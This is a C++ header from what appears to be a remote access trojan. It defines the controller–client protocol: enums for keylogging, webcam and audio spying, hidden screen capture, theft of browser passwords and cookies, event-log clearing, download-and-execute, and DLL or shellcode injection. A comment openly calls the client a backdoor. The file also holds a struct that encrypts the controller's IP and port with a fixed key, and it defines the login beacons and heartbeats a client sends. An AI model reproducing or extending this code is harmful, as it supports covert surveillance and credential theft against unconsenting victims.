#pragma once
#include <vector>
#include <string>
#include <iosfwd>
#include <iostream>
#include <sstream>
#include <string.h>
#include <map>
#include <numeric> 
#include <ctime>
#include <chrono>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <concrt.h>
#include <corecrt_io.h>
#define MVirtualFree(a1, a2, a3) VirtualFree(a1, a2, a3)
#define MVirtualAlloc(a1, a2, a3, a4) VirtualAlloc(a1, a2, a3, a4)
#else // 使得该头文件在 LINUX 正常使用
#include <thread>
#define strcat_s strcat
#define sprintf_s sprintf
#define strcpy_s strcpy
#define __stdcall 
#define WINAPI 
#define TRUE 1
#define FALSE 0
#define skCrypt(p)
#define Mprintf printf
#define ASSERT(p)
#define AUTO_TICK_C(p)
#define AUTO_TICK(p)
#define OutputDebugStringA(p) printf(p)

#include <unistd.h>
#define Sleep(n) ((n) >= 1000 ? sleep((n) / 1000) : usleep((n) * 1000))

typedef int64_t __int64;
typedef uint32_t DWORD;
typedef int BOOL, SOCKET;
typedef unsigned int ULONG;
typedef unsigned int UINT;
typedef void VOID;
typedef unsigned char BYTE;
typedef BYTE* PBYTE, * LPBYTE;
typedef void* LPVOID, * HANDLE;

#define GET_PROCESS(a1, a2) 
#define MVirtualFree(a1, a2, a3) delete[]a1
#define MVirtualAlloc(a1, a2, a3, a4) new BYTE[a2]
#define CopyMemory memcpy
#define MoveMemory memmove

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
#define CloseHandle(p)
#define CancelIo(p) close(reinterpret_cast<intptr_t>(p))
#endif

#include "ip_enc.h"
#include <time.h>
#include <unordered_map>

#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// 以下2个数字需全局唯一，否则在生成服务时会出问题

#define FLAG_FINDEN "Hello, World!"

#define FLAG_GHOST	FLAG_FINDEN

// 主控程序唯一标识
#define MASTER_HASH "61f04dd637a74ee34493fc1025de2c131022536da751c29e3ff4e9024d8eec43"

#ifndef GET_FILEPATH
#define GET_FILEPATH(dir,file) [](char*d,const char*f){char*p=d;while(*p)++p;while('\\'!=*p&&p!=d)--p;strcpy(p+1,f);return d;}(dir,file)
#endif

inline int isValid_60s() {
	static time_t tm = time(nullptr);
	int span = int(time(nullptr) - tm);
	return span <= 60;
}

inline int isValid_30s() {
	static time_t tm = time(nullptr);
	int span = int(time(nullptr) - tm);
	return span <= 30;
}

inline int isValid_10s() {
	static time_t tm = time(nullptr);
	int span = int(time(nullptr) - tm);
	return span <= 10;
}

// 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
#define DLL_VERSION __DATE__		// DLL版本

#define TALK_DLG_MAXLEN 1024		// 最大输入字符长度

// 客户端状态: 1-被控端退出 2-主控端退出
enum State {
	S_CLIENT_NORMAL = 0,
	S_CLIENT_EXIT = 1,
	S_SERVER_EXIT = 2,
	S_CLIENT_UPDATE = 3,
};

// 命令枚举列表
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送

	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件

	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	COMMAND_SERVICES,				// 服务管理
	COMMAND_REGEDIT,
	COMMAND_TALK,					// 即时消息验证
	COMMAND_UPDATE = 53,			// 客户端升级
	COMMAND_SHARE = 59,				// 分享主机
	COMMAND_PROXY = 60,				// 代理映射
	TOKEN_SYSINFOLIST = 61,			// 主机管理
	TOKEN_CHAT_START = 62,			// 远程交谈

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常

	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容

	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据

	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据

	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_SERVERLIST,               // 服务列表
	COMMAND_SERVICELIST,            // 刷新服务列表        
	COMMAND_SERVICECONFIG,          // 服务端发出的标识
	TOKEN_TALK_START,				// 即时消息开始
	TOKEN_TALKCMPLT,				// 即时消息可重发
	TOKEN_KEYFRAME=134,				// 关键帧
	TOKEN_BITMAPINFO_HIDE,          // 虚拟屏幕
	TOKEN_SCREEN_SIZE,              // 屏幕大小
	TOKEN_DRIVE_LIST_PLUGIN = 150,	// 文件管理(插件)
	TOKEN_DRAWING_BOARD=151,		// 画板 

	TOKEN_DECRYPT = 199,
	TOKEN_REGEDIT = 200,            // 注册表
	COMMAND_REG_FIND,				// 注册表 管理标识
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// 被控端退出
	SERVER_EXIT=205,				// 主控端退出

	SOCKET_DLLLOADER=210,           // 客户端请求DLL
	CMD_DLLDATA,                    // 响应DLL数据
	CMD_RUNASADMIN=214,             // ADMIN 运行
	CMD_MASTERSETTING = 215,		// 主控设置
	CMD_HEARTBEAT_ACK = 216,		// 心跳回应
	CMD_PADDING =217,
	CMD_AUTHORIZATION = 222,		// 授权
	CMD_SERVER_ADDR = 229,          // 主控地址
	TOKEN_ERROR = 230,              // 错误提示
	TOKEN_SHELL_DATA = 231,         // 终端结果
	CMD_EXECUTE_DLL = 240,			// 执行代码
};

enum ProxyManager {
	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_BIND_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_CONNECT,
	COMMAND_PROXY_DATA,
	COMMAND_PROXY_CONNECT_HOSTNAME,
};

// 后台屏幕其他命令
enum HideScreenSpy {
	COMMAND_FLUSH_HIDE,             // 刷新屏幕
	COMMAND_SCREEN_SETSCREEN_HIDE,  // 重置分辨率
	COMMAND_HIDE_USER,              // 自定义命令
	COMMAND_HIDE_CLEAR,             // 清理后台
	COMMAND_COMMAND_SCREENUALITY60_HIDE, // 清晰度
	COMMAND_COMMAND_SCREENUALITY85_HIDE, // 清晰度
	COMMAND_COMMAND_SCREENUALITY100_HIDE, // 清晰度

	IDM_OPEN_Explorer = 33,
	IDM_OPEN_run,
	IDM_OPEN_Powershell,

	IDM_OPEN_360JS,
	IDM_OPEN_360AQ,
	IDM_OPEN_360AQ2,
	IDM_OPEN_Chrome,
	IDM_OPEN_Edge,
	IDM_OPEN_Brave,
	IDM_OPEN_Firefox,
	IDM_OPEN_Iexplore,
	IDM_OPEN_ADD_1,
	IDM_OPEN_ADD_2,
	IDM_OPEN_ADD_3,
	IDM_OPEN_ADD_4,
	IDM_OPEN_zdy,
	IDM_OPEN_zdy2,
	IDM_OPEN_close,
};

struct ZdyCmd {
	char                oldpath[_MAX_PATH];
	char                newpath[_MAX_PATH];
	char                cmdline[_MAX_PATH];
};

// 解密数据
enum DecryptCommand {
	COMMAND_LLQ_GetChromePassWord,
	COMMAND_LLQ_GetEdgePassWord,
	COMMAND_LLQ_GetSpeed360PassWord,
	COMMAND_LLQ_Get360sePassWord,
	COMMAND_LLQ_GetQQBroPassWord,

	COMMAND_LLQ_GetChromeCookies,
};

typedef DecryptCommand BroType;

// 这是服务管理页面既有定义
#define CMD_WINDOW_CLOSE	0		// 关闭窗口
#define CMD_WINDOW_TEST		1		// 操作窗口

// MachineManager 系统管理, 前几个枚举值顺序不得修改
enum MachineManager {
	COMMAND_MACHINE_PROCESS,
	COMMAND_MACHINE_WINDOWS,
	COMMAND_MACHINE_NETSTATE,
	COMMAND_MACHINE_SOFTWARE,
	COMMAND_MACHINE_HTML,
	COMMAND_MACHINE_FAVORITES,
	COMMAND_MACHINE_WIN32SERVICE,
	COMMAND_MACHINE_DRIVERSERVICE,
	COMMAND_MACHINE_TASK,
	COMMAND_MACHINE_HOSTS, //不能乱序号

	COMMAND_APPUNINSTALL,//卸载
	COMMAND_WINDOW_OPERATE,//窗口控制
	COMMAND_WINDOW_CLOSE,//关闭
	COMMAND_PROCESS_KILL,//结束进程
	COMMAND_PROCESS_KILLDEL,//结束进程----删除
	COMMAND_PROCESS_DEL,//强制删除 不需要结束进程
	COMMAND_PROCESS_FREEZING,//冻结
	COMMAND_PROCESS_THAW,//解冻
	COMMAND_HOSTS_SET,//hosts

	COMMAND_SERVICE_LIST_WIN32,
	COMMAND_SERVICE_LIST_DRIVER,
	COMMAND_DELETESERVERICE,
	COMMAND_STARTSERVERICE,
	COMMAND_STOPSERVERICE,
	COMMAND_PAUSESERVERICE,
	COMMAND_CONTINUESERVERICE,

	COMMAND_TASKCREAT,
	COMMAND_TASKDEL,
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_INJECT,

	TOKEN_MACHINE_PROCESS,
	TOKEN_MACHINE_WINDOWS,
	TOKEN_MACHINE_NETSTATE,
	TOKEN_MACHINE_SOFTWARE,
	TOKEN_MACHINE_HTML,
	TOKEN_MACHINE_FAVORITES,
	TOKEN_MACHINE_WIN32SERVICE,
	TOKEN_MACHINE_DRIVERSERVICE,
	TOKEN_MACHINE_HOSTS,
	TOKEN_MACHINE_SERVICE_LIST,
	TOKEN_MACHINE_TASKLIST,

	TOKEN_MACHINE_MSG,
};

struct  WINDOWSINFO {
	char strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};

// 远程交谈
enum ChatManager {
	COMMAND_NEXT_CHAT,
	COMMAND_CHAT_CLOSE,
	COMMAND_CHAT_SCREEN_LOCK,
	COMMAND_CHAT_SCREEN_UNLOCK,
};

// 文件管理
enum FileManager {
	COMMAND_COMPRESS_FILE_PARAM=220,
	COMMAND_FILES_SEARCH_START,
	COMMAND_FILES_SEARCH_STOP,
	COMMAND_FILE_EXCEPTION,
	COMMAND_SEARCH_FILE,
	COMMAND_FILE_GETNETHOOD,
	COMMAND_FILE_RECENT,
	COMMAND_FILE_INFO,
	COMMAND_FILE_Encryption,
	COMMAND_FILE_Decrypt,
	COMMAND_FILE_ENFOCE,
	COMMAND_FILE_CopyFile,
	COMMAND_FILE_PasteFile,
	COMMAND_FILE_zip,
	COMMAND_FILE_zip_stop,
	COMMAND_FILE_NO_ENFORCE,
	COMMAND_FILE_GETINFO,

	COMMAND_FILE_SEARCHPLUS_LIST,

	TOKEN_SEARCH_FILE_LIST,
	TOKEN_SEARCH_FILE_FINISH,
	TOKEN_CFileManagerDlg_DATA_CONTINUE,
	TOKEN_COMPRESS_FINISH,
	TOKEN_SEARCH_ADD,
	TOKEN_SEARCH_END,
	TOKEN_FILE_GETNETHOOD,
	TOKEN_FILE_RECENT,
	TOKEN_FILE_INFO,
	TOKEN_FILE_REFRESH,
	TOKEN_FILE_ZIPOK,
	TOKEN_FILE_GETINFO,

	TOKEN_FILE_SEARCHPLUS_LIST,
	TOKEN_FILE_SEARCHPLUS_NONTFS,
	TOKEN_FILE_SEARCHPLUS_HANDLE,
	TOKEN_FILE_SEARCHPLUS_INITUSN,
	TOKEN_FILE_SEARCHPLUS_GETUSN,
	TOKEN_FILE_SEARCHPLUS_NUMBER,
};

// 远程画板
enum RemoteDraw {
	CMD_DRAW_POINT = 0,
	CMD_DRAW_END = 1,
	CMD_TRANSPORT = 2,
	CMD_TOPMOST = 3,
	CMD_MOVEWINDOW = 4,
	CMD_SET_SIZE = 5,
	CMD_DRAW_CLEAR = 6,
	CMD_DRAW_TEXT = 7,
};

enum 
{
	CLIENT_TYPE_DLL = 0,			// 客户端代码以DLL运行
	CLIENT_TYPE_ONE = 1,			// 客户端代码以单个EXE运行
	CLIENT_TYPE_MEMEXE = -1,		// 内存EXE运行
	CLIENT_TYPE_MODULE = 2,			// DLL需由外部程序调用
	CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
	CLIENT_TYPE_MEMDLL = 5,			// 内存DLL运行
	CLIENT_TYPE_LINUX = 6,			// LINUX 客户端
};

enum {
	SHARE_TYPE_YAMA = 0,			// 分享给同类程序
	SHARE_TYPE_HOLDINGHANDS = 1,	// 分享给 HoldingHands: https://github.com/yuanyuanxiang/HoldingHands
};

inline const char* GetClientType(int typ) {
	switch (typ)
	{
	case CLIENT_TYPE_DLL:
		return "DLL";
	case CLIENT_TYPE_ONE:
		return "EXE";
	case CLIENT_TYPE_MEMEXE:
		return "MEXE";
	case CLIENT_TYPE_MODULE:
		return "DLL";
	case CLIENT_TYPE_SHELLCODE:
		return "SC";
	case CLIENT_TYPE_MEMDLL:
		return "MDLL";
	case CLIENT_TYPE_LINUX:
		return "LNX";
	default:
		return "DLL";
	}
}

inline int compareDates(const std::string& date1, const std::string& date2) {
	static const std::unordered_map<std::string, int> monthMap = {
		{"Jan", 1}, {"Feb", 2}, {"Mar", 3}, {"Apr", 4}, {"May", 5}, {"Jun", 6},
		{"Jul", 7}, {"Aug", 8}, {"Sep", 9}, {"Oct",10}, {"Nov",11}, {"Dec",12}
	};

	auto parse = [&](const std::string& date) -> std::tuple<int, int, int> {
		int month = monthMap.at(date.substr(0, 3));
		int day = std::stoi(date.substr(4, 2));
		int year = std::stoi(date.substr(7, 4));
		return { year, month, day };
	};

	try {
		auto t1 = parse(date1);
		auto t2 = parse(date2);
		int y1 = std::get<0>(t1), m1 = std::get<1>(t1), d1 = std::get<2>(t1);
		int y2 = std::get<0>(t2), m2 = std::get<1>(t2), d2 = std::get<2>(t2);

		if (y1 != y2) return y1 < y2 ? -1 : 1;
		if (m1 != m2) return m1 < m2 ? -1 : 1;
		if (d1 != d2) return d1 < d2 ? -1 : 1;
		return 0;
	}
	catch (const std::exception& e) {
		std::cerr << "Date parse error: " << e.what() << std::endl;
		return -2; // 返回特殊值表示出错
	}
}

// 此枚举值和ClientType相似，但又不是完全一致，专为`TestRun`定制
// 指本质上运行`ServerDll`的形式
// `TestRun` 只用于技术研究目的
enum TestRunType {
	Startup_DLL,			// 磁盘DLL
	Startup_MEMDLL,			// 内存DLL（无磁盘文件）
	Startup_InjDLL,			// 远程注入 DLL（注入DLL路径，仍依赖磁盘DLL）
	Startup_Shellcode,		// 本地 Shell code （在当前程序执行shell code ）
	Startup_InjSC,			// 远程 Shell code （注入其他程序执行shell code ）
};

inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
{
	for (int i = 0; i < iBufferSize - iKeySize; ++i)
	{
		if (0 == memcmp(szBuffer + i, Key, iKeySize))
		{
			return i;
		}
	}
	return -1;
}

enum ProtoType {
	PROTO_TCP = 0,					// TCP
	PROTO_UDP = 1,					// UDP
	PROTO_HTTP = 2,					// HTTP
	PROTO_HTTPS = 3,				// HTTPS
};

enum RunningType {
	RUNNING_RANDOM = 0,				// 随机上线
	RUNNING_PARALLEL = 1,			// 并发上线
};

enum ProtocolEncType {
	PROTOCOL_SHINE = 0,
	PROTOCOL_HELL = 1,
};

#pragma pack(push, 4)
// 所连接的主控程序信息
typedef struct CONNECT_ADDRESS
{
public:
	char	        szFlag[32];		 // 标识
	char			szServerIP[100]; // 主控IP
	char			szPort[8];		 // 主控端口
	int				iType;			 // 客户端类型
	bool            bEncrypt;		 // 上线信息是否加密
	char            szBuildDate[12]; // 构建日期(版本)
	int             iMultiOpen;		 // 支持打开多个
	int				iStartup;		 // 启动方式
	int				iHeaderEnc;		 // 数据加密类型
	char			protoType;		 // 协议类型
	char			runningType;	 // 运行方式
	char            szReserved[52];  // 占位，使结构体占据300字节
	uint64_t		superAdmin;		 // 管理员主控ID
	char			pwdHash[64];	 // 密码哈希

public:
	void SetType(int typ) {
		iType = typ;
	}
	const void* Flag() const {
		return szFlag;
	}
	CONNECT_ADDRESS ModifyFlag(const char* flag) const {
		CONNECT_ADDRESS copy = *this;
		memset(copy.szFlag, 0, sizeof(szFlag));
		memcpy(copy.szFlag, flag, strlen(flag));
		return copy;
	}
	void SetAdminId(const char* admin) {
		char buf[17] = { 0 };
		std::strncpy(buf, admin, 16);
		superAdmin = std::strtoull(buf, NULL, 16);
	}
	int GetHeaderEncType() const {
#ifdef _DEBUG
		return iHeaderEnc;
#else
		return superAdmin == 7057226198541618915 ? iHeaderEnc : 0;
#endif
	}
	int FlagLen() const {
		return strlen(szFlag);
	}
	const char* ServerIP(){
		if (bEncrypt) {
			Decrypt();
		}
		return szServerIP;
	}
	int ServerPort() {
		if (bEncrypt) {
			Decrypt();
		}
		return atoi(szPort);
	}
	int ClientType()const {
		return iType;
	}
	// return true if modified
	bool SetServer(const char* ip, int port, bool e = false) {
		if (ip == NULL || strlen(ip) <= 0 || port <= 0)
			return false;
		bool modified = bEncrypt != e || strcmp(ServerIP(), ip) != 0 || port != ServerPort();
		bEncrypt = e;
		strcpy_s(szServerIP, ip);
		sprintf_s(szPort, "%d", port);

		return modified;
	}
	void Encrypt() {
		if (!bEncrypt){
			bEncrypt = true;
			StreamCipher cipher(0x12345678);
			cipher.process((uint8_t*)szServerIP, sizeof(szServerIP));
			cipher.process((uint8_t*)szPort, sizeof(szPort));
		}
	}
	void Decrypt() {
		if (bEncrypt) {
			bEncrypt = false;
			StreamCipher cipher(0x12345678);
			cipher.process((uint8_t*)szServerIP, sizeof(szServerIP));
			cipher.process((uint8_t*)szPort, sizeof(szPort));
		}
	}
	bool IsValid() {
		return strlen(ServerIP()) != 0 && ServerPort() > 0;
	}
	int Size() const {
		return sizeof(CONNECT_ADDRESS);
	}
} CONNECT_ADDRESS ;
#pragma pack(pop)

#define FOREVER_RUN 2

// 客户端程序线程信息结构体, 包含5个成员: 
// 运行状态(run)、句柄(h)、通讯客户端(p)、调用者参数(user)和连接信息(conn).
struct ThreadInfo
{
	int run;
	HANDLE h;
	void* p;
	void* user;
	CONNECT_ADDRESS* conn;
	ThreadInfo() : run(1), h(NULL), p(NULL), user(NULL), conn(NULL) { }
	void Exit(int wait_sec = 15) {
		run = 0;
		for (int count = 0; p && count++ < wait_sec; Sleep(1000));
#ifdef _WIN32
		if (p) TerminateThread(h, 0x20250626);
		if (p) CloseHandle(h);
#endif
		p = NULL;
		h = NULL;
		user = NULL;
		conn = NULL;
	}
};

struct PluginParam {
	char IP[100];			// 主控IP
	int Port;				// 主控端口
	State *Exit;			// 客户端状态
	void* User;				// CONNECT_ADDRESS* 指针
	PluginParam(const char*ip, int port, State *s, void* u=0) : Port(port), Exit(s), User(u){
		strcpy_s(IP, ip);
	}
};

// 将字符串按指定字符分隔为向量
inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1) {
	// 使用字符串流来分隔字符串
	std::istringstream stream(str);
	std::string item;
	std::vector<std::string> result;

	// 按分号分隔字符串
	while (std::getline(stream, item, ch)) {
		result.push_back(item);  // 将分隔出来的子字符串添加到结果向量中
	}
	while (result.size() < reserved)
		result.push_back("");

	return result;
}

enum LOGIN_RES {
	RES_CLIENT_TYPE = 0,					// 类型
	RES_SYSTEM_BITS = 1,					// 系统位数
	RES_SYSTEM_CPU = 2,						// CPU核数
	RES_SYSTEM_MEM = 3,						// 系统内存
	RES_FILE_PATH = 4,						// 文件路径
	RES_RESVERD = 5,						// ?
	RES_INSTALL_TIME = 6,					// 安装时间
	RES_INSTALL_INFO = 7,					// 安装信息
	RES_PROGRAM_BITS = 8,					// 程序位数
	RES_EXPIRED_DATE = 9,					// 到期日期
	RES_CLIENT_LOC = 10,					// 地理位置
	RES_CLIENT_PUBIP = 11,					// 公网地址
	RES_MAX,
};

// 服务上线后发送的计算机信息
// 此结构体一旦发生变化（比如大小），则以前版本的客户端无法连接新版主控.
// 新版客户端也无法连接老版本的主控程序.
// 为此，自20241228提交以来，为这个结构体预留字段，以便未来之不时之需
// 请勿再修改此结构体，除非你决定不再兼容以前的程序或者单独编写代码来兼容
typedef struct  LOGIN_INFOR
{
	unsigned char			bToken;									// 1.登陆信息
	char					OsVerInfoEx[156];						// 2.版本信息
	unsigned int			dwCPUMHz;								// 3.CPU主频
	char					moduleVersion[24];						// 4.DLL模块版本
	char					szPCName[240];							// 5.主机名
	char					szMasterID[20];							// 5.1 主控ID
	int						bWebCamIsExist;							// 6.是否有摄像头
	unsigned int			dwSpeed;								// 7.网速
	char					szStartTime[20];						// 8.启动时间
	char					szReserved[512];						// 9.保留字段

	LOGIN_INFOR(){
		memset(this, 0, sizeof(LOGIN_INFOR));
		bToken = TOKEN_LOGIN;
		strcpy_s(moduleVersion, DLL_VERSION);
	}
	LOGIN_INFOR& Speed(unsigned long speed) {
		dwSpeed = speed;
		return *this;
	}
	void AddReserved(const char* v) {
		if (strlen(szReserved))
			strcat_s(szReserved, "|");
		if (strlen(szReserved) + strlen(v) < sizeof(szReserved))
			strcat_s(szReserved, v);
	}
	void AddReserved(int n) {
		if (strlen(szReserved))
			strcat_s(szReserved, "|");
		char buf[24] = {};
		sprintf_s(buf, "%d", n);
		if (strlen(szReserved) + strlen(buf) < sizeof(szReserved))
			strcat_s(szReserved, buf);
	}
	void AddReserved(double f) {
		if (strlen(szReserved))
			strcat_s(szReserved, "|");
		char buf[24] = {};
		sprintf_s(buf, "%.2f", f);
		if (strlen(szReserved) + strlen(buf) < sizeof(szReserved))
			strcat_s(szReserved, buf);
	}
	std::vector<std::string> ParseReserved(int n = 1) const {
		return StringToVector(szReserved, '|', n);
	}
}LOGIN_INFOR;

// 固定1024字节
typedef struct Heartbeat
{
	uint64_t Time;
	char ActiveWnd[512];
	int Ping;
	int HasSoftware;
	char Reserved[496];

	Heartbeat() {
		memset(this, 0, sizeof(Heartbeat));
	}
	Heartbeat(const std::string& s, int ping = 0) {
		auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
			std::chrono::system_clock::now()
			);
		Time = system_ms.time_since_epoch().count();
		strcpy_s(ActiveWnd, s.c_str());
		Ping = ping;
		memset(Reserved, 0, sizeof(Reserved));
	}
	int Size() const {
		return sizeof(Heartbeat);
	}
}Heartbeat;

typedef struct HeartbeatACK {
	uint64_t Time;
	char Reserved[24];
}HeartbeatACK;

// 固定500字节
typedef struct MasterSettings {
	int         ReportInterval;             // 上报间隔
	int         Is64Bit;                    // 主控是否64位
	char        MasterVersion[12];          // 主控版本
	int			DetectSoftware;				// 检测软件
	char        Reserved[476];              // 预留
}MasterSettings;

// 100字节: 运行类型 + 大小 + 调用方式 + DLL名称
typedef struct DllExecuteInfo {
	int RunType;							// 运行类型
	int Size;								// DLL 大小
	int CallType;							// 调用方式
	char Name[32];							// DLL 名称
	char Md5[33];							// DLL MD5
	char Reseverd[23];
}DllExecuteInfo;

enum
{
	SOFTWARE_CAMERA = 0,
	SOFTWARE_TELEGRAM,

	SHELLCODE = 0,
	MEMORYDLL = 1,

	CALLTYPE_DEFAULT = 0,		// 默认调用方式: 只是加载DLL,需要在DLL加载时执行代码
	CALLTYPE_IOCPTHREAD = 1,	// 调用run函数启动线程: DWORD (__stdcall *run)(void* lParam)
};

typedef DWORD(__stdcall* PidCallback)(void);

inline const char* EVENTID(PidCallback pid) {
	static char buf[64] = { 0 };
	if (buf[0] == 0) {
		sprintf_s(buf, "SERVICE [%d] FINISH RUNNING", pid());
	}
	return buf;
}

#define EVENT_FINISHED EVENTID(GetCurrentProcessId)

inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
	for (char key : keys) {
		for (int i = 0; i < len; ++i) {
			data[i] ^= key;
		}
	}
}

inline std::tm ToPekingTime(const time_t* t) {
	// 获取当前时间（如果传入的指针为空）
	std::time_t now = (t == nullptr) ? std::time(nullptr) : *t;

	// 线程安全地转换为 UTC 时间
	std::tm utc_time{};

#ifdef _WIN32  // Windows 使用 gmtime_s
	if (gmtime_s(&utc_time, &now) != 0) {
		return { 0, 0, 0, 1, 0, 100 }; // 失败时返回 2000-01-01 00:00:00
	}
#else  // Linux / macOS 使用 gmtime_r
	if (gmtime_r(&now, &utc_time) == nullptr) {
		return { 0, 0, 0, 1, 0, 100 };
	}
#endif

	// 转换为北京时间（UTC+8）
	utc_time.tm_hour += 8;

	// 规范化时间（处理溢出，如跨天）
	std::mktime(&utc_time);

	return utc_time;
}

inline std::string ToPekingTimeAsString(const time_t* t) {
	auto pekingTime = ToPekingTime(t);
	char buffer[20];
	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &pekingTime);
	return buffer;
}

typedef struct Validation {
	char From[20];			// 开始日期
	char To[20];			// 结束日期
	char Admin[100];		// 管理员地址（当前主控的公网地址）
	int Port;				// 管理员端口（默认当前端口）
	char Checksum[16];		// 预留字段
	Validation(float days, const char* admin, int port, const char* id="") {
		time_t from = time(NULL), to = from + time_t(86400 * days);
		memset(this, 0, sizeof(Validation));
		std::string fromStr = ToPekingTimeAsString(&from);
		std::string toStr = ToPekingTimeAsString(&to);
		strcpy_s(From, fromStr.c_str());
		strcpy_s(To, toStr.c_str());
		strcpy_s(Admin, admin);
		Port = port;
		if(strlen(id))memcpy(Checksum, id, 16);
	}
	bool IsValid() const {
		std::string now = ToPekingTimeAsString(NULL);
		return From <= now && now <= To;
	}
}Validation;

#ifdef _DEBUG
// 为了解决远程桌面屏幕花屏问题而定义的宏，仅调试时使用，正式版本没有
#define SCREENYSPY_IMPROVE 0
#define SCREENSPY_WRITE 0
#endif

#ifdef _WIN32

#ifdef _WINDOWS
#include <afxwin.h>
#else
